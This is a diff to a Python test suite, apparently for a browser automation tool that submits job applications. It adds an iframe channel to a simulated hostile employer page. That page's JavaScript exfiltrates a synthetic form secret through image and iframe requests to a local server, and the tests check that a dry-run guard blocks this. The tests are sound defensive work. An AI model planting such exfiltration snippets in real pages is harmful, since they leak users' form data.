@@ -17,11 +17,17 @@ from jobctrl.apply import chrome
 class _HostileEmployerHandler(BaseHTTPRequestHandler):
     posts: list[str] = []
     deletes: list[str] = []
-    get_exfiltrations: list[str] = []
+    image_get_exfiltrations: list[str] = []
+    document_get_exfiltrations: list[str] = []
 
     def do_GET(self) -> None:  # noqa: N802 - stdlib hook name
-        if self.path.startswith("/exfil"):
-            type(self).get_exfiltrations.append(self.path)
+        if self.path.startswith("/image-exfil"):
+            type(self).image_get_exfiltrations.append(self.path)
+            self.send_response(204)
+            self.end_headers()
+            return
+        if self.path.startswith("/document-exfil"):
+            type(self).document_get_exfiltrations.append(self.path)
             self.send_response(204)
             self.end_headers()
             return
@@ -39,7 +45,10 @@ class _HostileEmployerHandler(BaseHTTPRequestHandler):
               const input = document.getElementById("candidate");
               input.value = "synthetic-profile-secret";
               const pixel = new Image();
-              pixel.src = "{employer_origin}/exfil?value=" + encodeURIComponent(input.value);
+              pixel.src = "{employer_origin}/image-exfil?value=" + encodeURIComponent(input.value);
+              const frame = document.createElement("iframe");
+              frame.src = "{employer_origin}/document-exfil?value=" + encodeURIComponent(input.value);
+              document.body.appendChild(frame);
               fetch("{employer_origin}/auto-submit", {{ method: "POST", body: "auto" }}).catch(() => {{}});
               fetch("{employer_origin}/delete-submit", {{ method: "DELETE" }}).catch(() => {{}});
               try {{ navigator.sendBeacon("{employer_origin}/beacon", "beacon"); }} catch (_) {{}}
@@ -81,7 +90,8 @@ def test_dry_run_cdp_guard_blocks_hostile_employer_exfiltration(tmp_path, monkey
 
     _HostileEmployerHandler.posts = []
     _HostileEmployerHandler.deletes = []
-    _HostileEmployerHandler.get_exfiltrations = []
+    _HostileEmployerHandler.image_get_exfiltrations = []
+    _HostileEmployerHandler.document_get_exfiltrations = []
     server = ThreadingHTTPServer(("127.0.0.1", 0), _HostileEmployerHandler)
     server_thread = threading.Thread(target=server.serve_forever, daemon=True)
     server_thread.start()
@@ -111,7 +121,8 @@ def test_dry_run_cdp_guard_blocks_hostile_employer_exfiltration(tmp_path, monkey
             assert blocked is True
             assert _HostileEmployerHandler.posts == []
             assert _HostileEmployerHandler.deletes == []
-            assert _HostileEmployerHandler.get_exfiltrations == []
+            assert _HostileEmployerHandler.image_get_exfiltrations == []
+            assert _HostileEmployerHandler.document_get_exfiltrations == []
             evidence = chrome.get_dry_run_cdp_guard_evidence(dry_port)
             channels = set(evidence["blocked_channels"])
             assert evidence["coverage"] == "partial"
@@ -138,14 +149,16 @@ def test_dry_run_cdp_guard_blocks_hostile_employer_exfiltration(tmp_path, monkey
                 (
                     not _HostileEmployerHandler.posts
                     or not _HostileEmployerHandler.deletes
-                    or not _HostileEmployerHandler.get_exfiltrations
+                    or not _HostileEmployerHandler.image_get_exfiltrations
+                    or not _HostileEmployerHandler.document_get_exfiltrations
                 )
                 and time.time() < deadline
             ):
                 time.sleep(0.1)
             assert _HostileEmployerHandler.posts
             assert _HostileEmployerHandler.deletes
-            assert _HostileEmployerHandler.get_exfiltrations
+            assert _HostileEmployerHandler.image_get_exfiltrations
+            assert _HostileEmployerHandler.document_get_exfiltrations
         finally:
             chrome.cleanup_worker(902, live_proc)
     finally:
@@ -162,6 +175,20 @@ def test_dry_run_request_policy_blocks_all_mutating_methods():
     assert chrome._should_block_dry_run_request("GET", resource_type="Image") is True
     assert chrome._should_block_dry_run_request("GET", resource_type="Fetch") is True
     assert chrome._should_block_dry_run_request("HEAD", resource_type="Script") is True
+    assert (
+        chrome._should_block_dry_run_request(
+            "GET",
+            resource_type="Document",
+        )
+        is True
+    )
+    assert (
+        chrome._should_block_dry_run_request(
+            "HEAD",
+            resource_type="Document",
+        )
+        is True
+    )
     assert (
         chrome._should_block_dry_run_request(
             "GET",
